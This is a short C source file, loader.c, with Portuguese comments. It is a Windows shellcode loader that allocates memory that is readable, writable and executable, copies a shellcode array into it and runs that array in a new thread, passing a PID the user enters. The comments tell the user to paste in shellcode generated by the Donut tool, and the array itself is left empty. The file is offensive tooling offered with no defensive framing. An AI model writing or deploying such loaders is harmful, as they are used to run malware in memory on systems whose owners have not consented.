// loader.c
#include <windows.h>
#include <stdio.h>

// Carregar shellcode da .bin gerada
unsigned char shellcode[] = {
    // coloque aqui o conteúdo de shellcode.bin gerado pelo Donut
    // ou use fread para ler de arquivo, mas vou deixar hardcoded no exemplo
};

int main() {
    DWORD pid;
    printf("Digite o PID do processo que quer abrir (ex: notepad.exe): ");
    scanf("%lu", &pid);

    // Aloca memória RWX
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);

    if (!addr) {
        printf("VirtualAlloc failed.\n");
        return 1;
    }

    memcpy(addr, shellcode, sizeof(shellcode));

    // Passa o PID como argumento para o shellcode
    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)addr,
                                  &pid, 0, NULL);

    if (!hThread) {
        printf("CreateThread failed.\n");
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
